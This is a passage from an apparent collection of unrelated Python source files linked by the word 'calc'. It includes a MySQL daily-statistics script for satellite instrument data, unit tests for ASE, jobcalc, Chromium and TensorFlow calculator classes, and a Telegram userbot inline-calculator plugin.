common.utc_YmdH()\nelse:\n    calc_date += '-01' # 2014-08-02-01\ntimespan = common.get_calc_timespan(calc_date, '24')\n# timespan = common.get_last_mon_calc_timespan(timespan)\ntime_tag = timespan['begin_str'] + '`' + timespan['end_str'] + '`'\n\n# mysql tables we should calc\nmy_channel_table = []\nmy_obc_table = []\nmy_calculate_table=[]\n\ncommon.wt_file(my_pidfile, str(pid))\ncommon.info(my_log, log_tag, time_tag + 'program start')\n\n# Deal with signal.\ndef signal_handler(signum, frame):\n    msg = 'FAILED`recv signal ' + str(signum) + '. exit now.'\n    common.info(my_log, log_tag, time_tag + msg)\n\n    if os.path.isfile(my_pidfile):\n        os.remove(my_pidfile)\n    \n    sys.exit(0)\n\n# for each obc setting, calc and insert to STAT.\ndef calc_just_obc():\n    if len(my_obc_table) <= 0:\n        return True\n    \n    \n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'], \n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n    except MySQLdb.Error, e:\n        msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n        \n    for one_sds in ins_conf.obc_to_db.values():\n        for one_column in xrange(1, one_sds['columns'] + 1):\n            db_field = one_sds['db_field']\n            if one_sds['columns'] is not 1:\n                db_field += str(one_column)\n            \n            calc_sql = common.get_calc_daily_sql(db_field, my_obc_table,\n                                                 one_sds['fill_value'],\n                                                 conf.calc_daily_prefix_sql,\n                                                  conf.calc_daily_subsql,\n                                                 conf.calc_daily_postfix_sql)\n            common.debug(my_log, log_tag, time_tag + calc_sql)\n            try:\n                conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                cur.execute(calc_sql)\n                ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                conn.select_db(conf.db_setting['stat_db'])\n                data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                sql_data = [db_field, ret[0][0] ]\n                sql_data.extend(data)\n                cur.execute(daily_sql % tuple(sql_data))\n                conn.commit()\n            except MySQLdb.Error, e:\n                msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n                    + ']: ' + e.args[1]              \n                common.warning(my_log, log_tag, time_tag + msg)\n    if(ins!='mwri'):   \n        for one_sds in ins_conf.calc_to_db.values():\n            for one_column in xrange(1, one_sds['columns'] + 1):\n                db_field = one_sds['db_field']\n                if one_sds['columns'] is not 1:\n                    db_field += str(one_column)\n            \n                calc_sql = common.get_calc_daily_sql(db_field, my_calculate_table,\n                                                 one_sds['fill_value'],\n                                                 conf.calc_daily_prefix_sql,\n                                                  conf.calc_daily_subsql,\n                                                 conf.calc_daily_postfix_sql)\n                common.debug(my_log, log_tag, time_tag + calc_sql)\n                try:\n                    conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                    cur.execute(calc_sql)\n                    ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                    conn.select_db(conf.db_setting['stat_db'])\n                    data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                    sql_data = [db_field, ret[0][0] ]\n                    sql_data.extend(data)\n                    cur.execute(daily_sql % tuple(sql_data))\n                    conn.commit()\n                except MySQLdb.Error, e:\n                    msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n                    + ']: ' + e.args[1]              \n                    common.warning(my_log, log_tag, time_tag + msg)\n\n    try:\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        msg = 'calc_just_obc`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n\n    return True\n\n# for each obc setting, calc and insert to STAT.\ndef calc_one_channel(channel):\n    if len(my_channel_table) <= 0:\n        return True\n    \n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n    except MySQLdb.Error, e:\n        msg = 'calc_one_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n            + str(e.args[0]) + ']: ' + e.args[1]              \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n        \n    for one_sds in ins_conf.obc_3dim_to_calc.values():\n        for one_column in xrange(1, one_sds['columns'] + 1):\n            db_field = one_sds['db_field']\n            if one_sds['columns'] is not 1:\n                db_field += str(one_column)\n            \n            calc_sql = common.get_calc_daily_channel_sql(channel,\n                                                 db_field, my_channel_table,\n                                                 one_sds['fill_value'],\n                                                 conf.calc_daily_prefix_sql,\n                                                 conf.calc_daily_channel_subsql,\n                                                 conf.calc_daily_postfix_sql)\n            common.debug(my_log, log_tag, time_tag + calc_sql)\n            try:\n                conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                cur.execute(calc_sql)\n                ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                conn.select_db(conf.db_setting['stat_db'])\n                data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                sql_data = [db_field, channel, ret[0][0] ]\n                sql_data.extend(data)\n                cur.execute(daily_channel_sql % tuple(sql_data))\n                conn.commit()\n            except MySQLdb.Error, e:\n                msg = 'calc_one_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n                    + str(e.args[0]) + ']: ' + e.args[1]              \n                common.warning(my_log, log_tag, time_tag + msg)\n\n    #try:\n    #    cur.close()\n    #    conn.close()\n    #except MySQLdb.Error, e:\n    #    msg = 'calc_one_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n    #        + str(e.args[0]) + ']: ' + e.args[1]              \n    #    common.err(my_log, log_tag, time_tag + msg)\n    #    return False\n    \n\n    \n    calc_daily_prefix_sql = 'select count(value), avg(value), max(value), min(value), ' \\\n                            'STDDEV_POP(value) from ('\n    calc_daily_subsql = 'select value from %s where type= \\'%s\\' and value!=%s'\n    calc_daily_channel_subsql = 'select value from %s where channel=%s and type= \\'%s\\' and value !=%s'\n    calc_daily_postfix_sql = ') as total'\n\n    if(ins=='iras'):\n        for one_sds in ins_conf.calc_3dim_to_db.values():\n            for one_column in xrange(1, one_sds['columns'] + 1):\n                db_field = one_sds['db_field']\n                \n                if one_sds['columns'] is not 1:\n                    db_field += str(one_column)\n                calc_sql = calc_daily_channel_sql(channel,\n                                                     db_field, my_calc_channel_table,\n                                                     one_sds['fill_value'],\n                                                     calc_daily_prefix_sql,\n                                                     calc_daily_channel_subsql,\n                                                     calc_daily_postfix_sql)\n                print calc_sql\n                common.debug(my_log, log_tag, time_tag + calc_sql)\n                try:\n                    conn.select_db(conf.table_setting[sat][ins]['data_db'])\n                    cur.execute(calc_sql)\n                    ret = cur.fetchall() # count(), min(), max(), STDDEV_POP()\n                    conn.select_db(conf.db_setting['stat_db'])\n                    data = common.get_data_with_default(ret[0][1:], one_sds['factor'],\n                                                    default = 0)\n                    sql_data = [db_field, channel, ret[0][0] ]\n                    sql_data.extend(data)\n                    cur.execute(daily_channel_sql % tuple(sql_data))\n                    \n                    conn.commit()\n                except MySQLdb.Error, e:\n                    msg = 'calc_one_calc_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n                        + str(e.args[0]) + ']: ' + e.args[1]              \n                    common.warning(my_log, log_tag, time_tag + msg)\n            #print'channel table list'\n            #print calc_sql\n\n        try:\n            cur.close()\n            conn.close()\n        except MySQLdb.Error, e:\n            msg = 'calc_one_calc_channel ' + str(channel) + '`Mysql Fatal Error[' \\\n                + str(e.args[0]) + ']: ' + e.args[1]  \n            print msg            \n            common.err(my_log, log_tag, time_tag + msg)\n            return False\n\n    return True\n\ndef calc_daily_channel_sql(channel, field, tables, fill_value, \n                                prefix_sql, subsql, postfix_sql):\n\n    prefix ='select count(value), avg(value), max(value), min(value), ' \\\n                            'STDDEV_POP(value) from ('\n    subsql_total=''\n    for idx, one_table in enumerate(tables):\n        if idx == 0:\n            subsql_total =  subsql%(one_table,channel,field,fill_value) + subsql_total\n        else:\n            subsql_total =  subsql%(one_table,channel,field,fill_value) + ' union all ' +subsql_total\n\n    return prefix + subsql_total + postfix_sql\n\n\ndef calc_daily(input):\n    print input\n    if input == 'just_obc':\n        return calc_just_obc()\n    else:\n        return calc_one_channel(input)\n\n# register signal function.\nsignal.signal(signal.SIGTERM, signal_handler)   \nsignal.signal(signal.SIGINT, signal_handler)      \n\n# make sure ONLY ONE prog exist. kill other same program, avoiding hang.\n# we do NOT grep --date=2014-04-27-18 for convenience.\ncmd = conf.ps + ' -elf | ' + conf.grep + ' ' + conf.bin_path + ' | ' \\\n\t+ conf.grep + ' -v grep | ' + conf.grep + ' -v tail | ' + conf.grep + ' ' \\\n\t+ ' -v bash | ' + conf.grep + ' ' + fname + ' | ' + conf.grep \\\n\t+ \" '\\-\\-sat=\" + sat + \"' | \" + conf.grep + \" '\\-\\-ins=\" + ins + \"' | \" \\\n\t+ conf.grep + \" '\\-\\-nwp=\" + nwp + \"' | \" + conf.awk + \" '{print $4}'\"\n(status, value) = commands.getstatusoutput(cmd)\npid_list = value.split()\nfor one_pid in pid_list:\n\tif int(one_pid) != pid:\n\t\tmsg = 'more then one prog find, kill old same prog[' + one_pid + ']'\n\t\tcommon.err(my_log, log_tag, time_tag + msg)\n\t\tcmd = conf.kill + ' -kill ' + one_pid\n\t\tcommands.getstatusoutput(cmd)\n\n\"\"\"\nWe MUST create fy3b-mwts INFO db, for easy time search, not show tables!!\nalso, there is a BUG... ...\n\"\"\"\nshow_table_sql = \"show tables like '%\" + timespan['begin_str'][0:4] \\\n                + timespan['begin_str'][5:7] + timespan['begin_str'][8:10] \\\n                + \"%OBC%' \"\ntry:\n    conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                         user=conf.db_setting['master']['user'],\n                         passwd=conf.db_setting['master']['pwd'], \n                         port=conf.db_setting['master']['port'])\n    cur=conn.cursor()\n    conn.select_db(conf.table_setting[sat][ins]['data_db'])\n    cur.execute(show_table_sql) # the result is already sorted by ascii.\n    all_tables = cur.fetchall()\n    cur.close()\n    conn.close()\nexcept MySQLdb.Error, e:\n\tmsg = 'FAILED`Mysql Fatal Error[' + str(e.args[0])+']: '+e.args[1] \n\tcommon.err(my_log, log_tag, time_tag + msg)\n\tsys.exit(3)\n\n# ignore L1B table.\n#all_obc_table = [ x for x in all_tables if 'OBCXX_MS' in x[0] ]\n\nCalc_tag = 'OBCXX_MS_CALC'\nCalc_channel_tag='OBCXX_MS_CALC_'\nmy_calculate_table = [ x[0] for x in all_tables if Calc_tag in x[0]]\nmy_calc_channel_table=[ x[0] for x in all_tables if Calc_channel_tag in x[0]]\nmy_calculate_table =[ x for x in my_calculate_table if Calc_channel_tag not in x]\nchannel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n\nmy_channel_table = [ x[0] for x in all_tables if channel_tag in x[0]]\n\nmy_obc_table = [ x[0] for x in all_tables if 'OBCXX_MS_' not in x[0]]\n    #print obc_table\n\n\n \nprint 'begin'\nprint my_obc_table\nprint'------------------'\nprint my_calc_channel_table\nprint '------------------'\nprint my_channel_table\nprint '------------------'\nprint my_calculate_table\n\n#channel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n#my_channel_table = [ x[0] for x in all_tables if channel_tag in x[0]]\n#calculate_tag = 'OBCXX_MS_CALC'\n#my_calculate_table=[ x[0] for x in all_tables if calculate_tag in x[0]]\n#my_obc_table = [ x[0] for x in all_tables if channel_tag not in x[0]]\n#my_obc_table = [ x for x in my_obc_table if calculate_tag not in x]\n\nif len(my_channel_table)<=0:\n    msg = time_tag + 'no table found for 3-dims data'\n    common.warn(my_log, log_tag, msg)\n    sys.exit(4)\nif len(my_calculate_table)<=0:\n    msg = time_tag + 'no table found for calculate data'\n    common.warn(my_log, log_tag, msg)\n    \nif len(my_calc_channel_table)<=0:\n    msg = time_tag + 'no table found for 3-dims calculate data'\n    common.warn(my_log, log_tag, msg)\n    if(ins=='mwhs'):\n        sys.exit(4)\n#     if(ins!='mwts'):\n#         sys.exit(4)\nif len(my_obc_table)<=0:\n    msg = time_tag + 'no table found for 2-dims obc data'\n    common.error(my_log, log_tag, msg)\n    sys.exit(4)\ncommon.debug(my_log, log_tag, \"calculate tables:::::::::::::::::::::::::::::::::::::::::::::::::::::::::;\")   \nprint(my_obc_table)\n# get insert sql to STAT db.\ndaily_table = conf.table_setting[sat][ins]['daily']\ndaily_channel_table = conf.table_setting[sat][ins]['daily_channel']\ndaily_sql = 'replace into ' + daily_table + \" values('\"+timespan['begin_str'] \\\n\t    \t+ \"', '%s', %s, %s, %s, %s, %s)\"\ndaily_channel_sql = 'replace into ' + daily_channel_table + \" values('\" \\\n            + timespan['begin_str'] + \"', '%s', %s, %s, %s, %s, %s, %s)\"\n\n#pool = Pool()\n#ret = pool.map(calc_daily, ['just_obc'] + range(1, ins_conf.channels + 1) )\n#pool.close()\n#pool.join()\ncalc_daily('just_obc')\nfor channel in range(1,ins_conf.channels+1):\n    calc_daily(channel)\n\n\n# \n# if False in ret:\n# \tmsg = 'FAILED`calc failed.`timeuse='\n# else:\n# \tmsg = 'SUCC`program finish.`timeuse='\n#  \t\n# timeuse_end = time.time()\n# timeuse = str(round(timeuse_end - timeuse_begin, 2))\n# common.info(my_log, log_tag, time_tag + msg + timeuse)\n\n", "49": "def test_calculator_label():\n    from ase.calculators.calculator import Calculator\n\n    calc = Calculator()\n    assert calc.directory == '.'\n    assert calc.prefix is None\n    assert calc.label is None\n\n    calc.label = 'dir/pref'\n    assert calc.directory == 'dir'\n    assert calc.prefix == 'pref'\n    assert calc.label == 'dir/pref'\n\n    calc.label = 'dir2/'\n    assert calc.directory == 'dir2'\n    assert calc.prefix is None\n    assert calc.label == 'dir2/'\n\n    calc.label = 'hello'\n    assert calc.directory == '.'\n    assert calc.prefix == 'hello'\n    assert calc.label == 'hello'\n\n    calc.label = None\n    assert calc.label is None\n    assert calc.prefix is None\n    assert calc.directory == '.'\n", "50": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\n\nimport pytest\nimport decimal\n\nfrom jobcalc.param_types import Currency  # , DISCOUNT  # , Percentage\nfrom jobcalc.exceptions import PercentageOutOfRange, InvalidFormatter, \\\n    HourlyRateError\nfrom jobcalc.utils import flatten\nfrom jobcalc.formatters import BasicFormatter, FormulaFormatter\n\nfrom jobcalc.core import calculate, BaseCalculator, Calculator, Context, \\\n    TerminalCalculator\n\n\ndef test_calculate():\n    value = calculate('1234', '50', '10', '300')\n    assert isinstance(value, Currency)\n    assert value.formatted_string() == '$1,921.20'\n\n    # using decimals as percentages\n    assert calculate('1234', '.5', '.1', '300') == value\n\n    with pytest.raises(PercentageOutOfRange):\n        calculate('1234', '110', '10', '300')\n\n    with pytest.raises(PercentageOutOfRange):\n        calculate('1234', '50', '110', '300')\n\n    assert calculate() == 0\n\n\nclass Test_BaseCalculator(object):\n\n    @classmethod\n    def setup_class(cls):\n        os.environ['DEBUG'] = 'true'\n        cls.calc = BaseCalculator(['123', '456'], '50', '10', '100')\n\n    @classmethod\n    def teardown_class(cls):\n        del(os.environ['DEBUG'])\n\n    def test_attributes(self):\n        assert list(flatten(self.calc.costs)) == ['123', '456']\n        assert self.calc.margins == ['50']\n        assert self.calc.discounts == ['10']\n        assert self.calc.deductions == ['100']\n\n        assert self.calc.total().formatted_string() == '$942.20'\n\n    def test_costs_handle_other_calculators(self):\n        calc2 = BaseCalculator(['123', self.calc], '50', '10', '100')\n        assert calc2.subtotal() == Currency('1065.2')\n        assert calc2.subtotal(ignore_margins=True) == Currency('702')\n\n        # class setting overrides default\n        calc2.ignore_margins = True\n        assert calc2.subtotal() == Currency('702')\n\n    def test_things_fail_with_invalid_items(self):\n        self.calc.costs.append(object())\n\n        with pytest.raises(decimal.InvalidOperation):\n            self.calc.total()\n\n        self.calc.costs = self.calc.costs[:-1]\n        self.calc.margins.append(object)\n\n        with pytest.raises(decimal.InvalidOperation):\n            self.calc.total()\n\n        self.calc.margins = self.calc.margins[:-1]\n\n        self.calc.discounts.append(object())\n        with pytest.raises(decimal.InvalidOperation):\n            self.calc.total()\n\n        self.calc.discounts = self.calc.discounts[:-1]\n\n        self.calc.deductions.append(object())\n        with pytest.raises(decimal.InvalidOperation):\n            self.calc.total()\n\n        self.calc.deductions = self.calc.deductions[:-1]\n\n\nclass Test_Calculator(object):\n\n    @classmethod\n    def setup_class(cls):\n        os.environ['DEBUG'] = 'true'\n\n        cls.calc = Calculator(\n            costs=['123', '456'],\n            margins='50',\n            discounts='10',\n            deductions='100',\n            hours='10',\n            rate='20',\n            formatters=BasicFormatter\n        )\n\n    @classmethod\n    def teardown_class(cls):\n        del(os.environ['DEBUG'])\n\n    def test_attributes(self):\n        calc = self.calc\n\n        assert isinstance(calc.formatters, list)\n        assert calc.formatters[0] == BasicFormatter\n        assert calc.rate == decimal.Decimal('20')\n        assert calc.hours == ['10']\n\n    def test_render(self):\n        assert self.calc.render() == '$1,302.20'\n\n        old_formatters = self.calc.formatters\n        self.calc.formatters = []\n        assert self.calc.render() == '$1,302.20'\n\n        self.calc.formatters.append([BasicFormatter, BasicFormatter])\n        assert self.calc.render() == '$1,302.20\\n\\n$1,302.20'\n        assert self.calc.render('\\n\\n\\n') == '$1,302.20\\n\\n\\n$1,302.20'\n\n        self.calc.formatters = old_formatters\n\n    def test_render_fails_with_invalid_formatter(self):\n        old_formatters = self.calc.formatters\n        self.calc.formatters = [object()]\n\n        with pytest.raises(InvalidFormatter):\n            self.calc.render()\n\n        self.calc.formatters = old_formatters\n\n    def test_ctx_fails_with_strict_option(self):\n        old_rate = self.calc.rate\n        self.calc.rate = 0\n        with pytest.raises(HourlyRateError):\n            with self.calc.ctx(strict=True):  # pragma: no cover\n                pass\n\n        # doesn't fail if strict is not ``True`` (default).\n        with self.calc.ctx() as ctx:\n            assert isinstance(ctx, Context)\n\n        self.calc.rate = old_rate\n\n    def test_update(self):\n        self.calc.update(\n            append=True,\n            margins='2.5',\n            discounts='5',\n            deductions='200',\n            hours=('10', '20', '30'),\n            rate='30',\n            formatters=FormulaFormatter(),\n            divider='/',\n            prompt=True\n        )\n\n        assert self.calc.margins[-1] == '2.5'\n        assert self.calc.discounts[-1] == '5'\n        assert self.calc.deductions[-1] == '200'\n        assert self.calc.hours[-1] == ('10', '20', '30')\n        assert self.calc.rate == decimal.Decimal('30')\n        assert isinstance(self.calc.formatters[-1], FormulaFormatter)\n        assert self.calc.config.divider == '/'\n\n        self.calc.update(\n            append=False,\n            hours=('20', '10')\n        )\n\n        assert self.calc.hours == [('20', '10')]\n\n        # works with a dict as the first arg as well.\n        self.calc.update({'margins': '25'})\n        assert self.calc.margins[-1] == '25'\n\n        with pytest.raises(TypeError):\n            # arg1 is not a dict or None\n            self.calc.update([])\n\n        class CustomCalc(Calculator):\n\n            def __init__(self, *args, someattr=None, **kwargs):\n                super().__init__(*args, **kwargs)\n                self.someattr = someattr\n\n        calc = CustomCalc(someattr='a')\n        assert calc.someattr == 'a'\n        calc.update(\n            append=True,\n            someattr='somevalue'\n        )\n        assert calc.someattr == 'somevalue'\n\n    def test_rate_does_not_change_with_invalid(self):\n        self.calc.rate = decimal.Decimal('20')\n        assert self.calc.rate == decimal.Decimal('20')\n        self.calc.rate = None\n        assert self.calc.rate == decimal.Decimal('20')\n        self.calc.rate = '-1'\n        assert self.calc.rate == decimal.Decimal('20')\n\n\nclass Test_TerminalCalculator(object):\n\n    @classmethod\n    def setup_class(cls):\n        os.environ['DEBUG'] = 'true'\n        cls.calc = TerminalCalculator()\n\n    @classmethod\n    def teardown_class(cls):\n        del(os.environ['DEBUG'])\n\n    def test_private_prompt_for_fails(self):\n        with pytest.raises(AttributeError):\n            self.calc._prompt_for('invalid')\n\n    def test_key_for_prompt(self):\n        # check all the prompts.\n        for prompt in self.calc._prompts:\n            if prompt == 'rate' or prompt == 'hours':\n                assert self.calc.key_for_prompt(prompt) == prompt\n            else:\n                assert self.calc.key_for_prompt(prompt) == prompt + 's'\n\n        # we can also handle if someone accidentally asks to prompt for a plural\n        # version, without raising errors.\n        assert self.calc.key_for_prompt('margins') == 'margins'\n        assert self.calc.key_for_prompt('rates') == 'rate'\n\n        # accidentally not pluralizing 'hours'\n        assert self.calc.key_for_prompt('hour') == 'hours'\n\n        # fail with invalid prompt.\n        with pytest.raises(AttributeError):\n            self.calc.key_for_prompt('invalid')\n\n    def test_prompt_for_context_manager_fails(self):\n        with pytest.raises(AttributeError):\n            with self.calc.prompt_for('invalid'):  # pragma: no cover\n                pass\n\n    def test_normalize(self):\n        assert self.calc.normalize('hours') == 'hours'\n        assert self.calc.normalize('margins') == 'margin'\n        assert self.calc.normalize('rate') == 'rate'\n        assert self.calc.normalize('rates') == 'rate'\n\n    def test_is_empty(self):\n        for prompt in self.calc._prompts:\n            assert self.calc.is_empty(prompt)\n\n        config = self.calc.config\n        config.default_hours = '3'\n        new_calc = TerminalCalculator(config=config)\n\n        assert new_calc._hours() == decimal.Decimal('3')\n        assert new_calc.is_empty('hours')\n\n        with pytest.raises(AttributeError):\n            self.calc.is_empty('invalid')\n\n        self.calc.costs.append('123')\n        assert not self.calc.is_empty('costs')\n", "51": "#!/usr/bin/env python\n# Copyright 2013 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nimport unittest\n\nfrom mock_function import MockFunction\n\n\nclass MockFunctionUnittest(unittest.TestCase):\n  def testMockFunction(self):\n    @MockFunction\n    def calc(a, b, mult=1):\n      return (a + b) * mult\n\n    self.assertTrue(*calc.CheckAndReset(0))\n    self.assertEqual(\n        (False, 'calc: expected 1 call(s), got 0'), calc.CheckAndReset(1))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertTrue(*calc.CheckAndReset(1))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertEqual(\n        (False, 'calc: expected 0 call(s), got 1'), calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertTrue(*calc.CheckAndReset(2))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertEqual(\n        (False, 'calc: expected 3 call(s), got 2'), calc.CheckAndReset(3))\n\n\nif __name__ == '__main__':\n  unittest.main()\n", "52": "from pathlib import Path\nimport pytest\nfrom ase.calculators.calculator import Calculator\n\n\ndef test_directory_and_label():\n    def normalize(path):\n        \"\"\"Helper function to normalize path\"\"\"\n        return str(Path(path))\n\n    calc = Calculator()\n\n    assert calc.directory == '.'\n    assert calc.label is None\n\n    calc.directory = 'somedir'\n\n    assert calc.directory == 'somedir'\n    assert calc.label == 'somedir/'\n\n    # We cannot redundantly specify directory\n    with pytest.raises(ValueError):\n        calc = Calculator(directory='somedir',\n                          label='anotherdir/label')\n\n    # Test only directory in directory\n    calc = Calculator(directory='somedir',\n                      label='label')\n\n    assert calc.directory == 'somedir'\n    assert calc.label == 'somedir/label'\n\n    wdir = '/home/somedir'\n    calc = Calculator(directory=wdir,\n                      label='label')\n\n    assert calc.directory == normalize(wdir)\n    assert calc.label == normalize(wdir) + '/label'\n\n    # Test we can handle pathlib directories\n    wdir = Path('/home/somedir')\n    calc = Calculator(directory=wdir,\n                      label='label')\n    assert calc.directory == normalize(wdir)\n    assert calc.label == normalize(wdir) + '/label'\n\n    with pytest.raises(ValueError):\n        calc = Calculator(directory=wdir,\n                          label='somedir/label')\n\n    # Passing in empty directories with directories in label should be OK\n    for wdir in ['somedir', '/home/directory']:\n        label = wdir + '/label'\n        expected_label = normalize(wdir) + '/label'\n        calc = Calculator(directory='', label=label)\n        assert calc.label == expected_label\n        assert calc.directory == normalize(wdir)\n\n        calc = Calculator(directory='.', label=label)\n        assert calc.label == expected_label\n        assert calc.directory == normalize(wdir)\n\n\ndef test_deprecated_get_spin_polarized():\n    calc = Calculator()\n    with pytest.warns(FutureWarning):\n        spinpol = calc.get_spin_polarized()\n    assert spinpol is False\n", "53": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "54": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await 